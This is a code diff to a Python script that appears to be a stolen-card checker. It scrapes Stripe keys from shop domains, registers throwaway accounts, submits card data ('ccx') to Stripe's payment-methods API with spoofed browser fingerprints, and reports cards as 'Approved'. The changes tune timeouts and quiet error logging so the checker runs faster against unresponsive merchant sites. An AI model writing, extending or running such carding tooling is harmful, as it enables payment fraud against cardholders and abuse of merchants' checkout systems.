@@ -978,13 +978,18 @@ def get_stripe_key(domain):
     for url in urls_to_try:
         try:
             logger.debug(f"Trying URL: {url}")
-            response = http_session_manager.session.get(url, timeout=10, allow_redirects=True, verify=False)
+            # Use a direct session without retries for key extraction to avoid timeouts
+            response = requests.get(url, timeout=5, allow_redirects=False, verify=False, headers=fingerprint.get_headers())
             if response.status_code == 200:
                 key = StripeKeyExtractor.extract(response.text)
                 if key:
+                    logger.debug(f"Found Stripe key: {key[:20]}...")
                     return key
+        except requests.Timeout:
+            logger.debug(f"Timeout getting Stripe key from {url}, skipping")
+            continue
         except Exception as e:
-            logger.error(f"Error getting Stripe key from {url}: {e}")
+            logger.debug(f"Error getting Stripe key from {url}: {e}")
             continue
     
     logger.debug(f"No Stripe key found for {domain}, returning None")
@@ -999,7 +1004,7 @@ def register_account(domain, session):
     """Register account on domain"""
     logger.debug(f"Registering account on {domain}")
     try:
-        reg_response = session.session.get(f"https://{domain}/my-account/", timeout=10, allow_redirects=True, verify=False)
+        reg_response = session.session.get(f"https://{domain}/my-account/", timeout=5, allow_redirects=True, verify=False)
         
         reg_nonce = extract_nonce_from_page(reg_response.text, domain)
         
@@ -1022,7 +1027,7 @@ def register_account(domain, session):
             f"https://{domain}/my-account/",
             data=reg_data,
             headers={'Referer': f'https://{domain}/my-account/'},
-            timeout=15,
+            timeout=10,
             verify=False
         )
         
@@ -1033,8 +1038,11 @@ def register_account(domain, session):
             logger.debug("Registration failed")
             return False, "Registration failed"
     
+    except requests.Timeout:
+        logger.debug(f"Registration timeout for {domain}")
+        return False, "Registration timeout"
     except Exception as e:
-        logger.error(f"Registration error: {e}")
+        logger.debug(f"Registration error: {e}")
         return False, f"Registration error: {str(e)}"
 
 
@@ -1074,8 +1082,8 @@ def process_card_enhanced(domain, ccx, use_registration=True):
     for url in payment_urls:
         try:
             logger.debug(f"Trying to get nonce from: {url}")
-            # Use the actual requests session inside HTTPSessionManager
-            response = session.session.get(url, timeout=10, allow_redirects=True, verify=False)
+            # Use shorter timeout (5 seconds) to avoid hanging on unresponsive domains
+            response = session.session.get(url, timeout=5, allow_redirects=True, verify=False)
             logger.debug(f"Response status: {response.status_code}, content length: {len(response.text)}")
             if response.status_code == 200:
                 html_content = response.text
@@ -1085,8 +1093,11 @@ def process_card_enhanced(domain, ccx, use_registration=True):
                     break
                 else:
                     logger.debug(f"No nonce found in response from {url}, trying next URL")
+        except requests.Timeout:
+            logger.debug(f"Timeout getting nonce from {url}, trying next URL")
+            continue
         except Exception as e:
-            logger.error(f"Error getting nonce from {url}: {e}", exc_info=True)
+            logger.debug(f"Error getting nonce from {url}: {e}")
             continue
     
     if not nonce:
@@ -1122,7 +1133,7 @@ def process_card_enhanced(domain, ccx, use_registration=True):
             'https://api.stripe.com/v1/payment_methods',
             data=payment_data,
             headers=fingerprint.get_stripe_headers(),
-            timeout=15,
+            timeout=10,
             verify=False
         )
         pm_data = pm_response.json()
@@ -1174,7 +1185,7 @@ def process_card_enhanced(domain, ccx, use_registration=True):
                         'x-requested-with': 'XMLHttpRequest',
                     },
                     data=data_payload,
-                    timeout=15,
+                    timeout=10,
                     verify=False
                 )
                 
@@ -1207,8 +1218,11 @@ def process_card_enhanced(domain, ccx, use_registration=True):
                     logger.debug("Payment succeeded")
                     return {"Response": "Card Added", "Status": "Approved"}
 
+            except requests.Timeout:
+                logger.debug(f"Timeout on endpoint {endpoint['url']}, trying next")
+                continue
             except Exception as e:
-                logger.error(f"Setup error: {e}")
+                logger.debug(f"Setup error: {e}")
                 continue
 
     logger.error("All payment attempts failed")
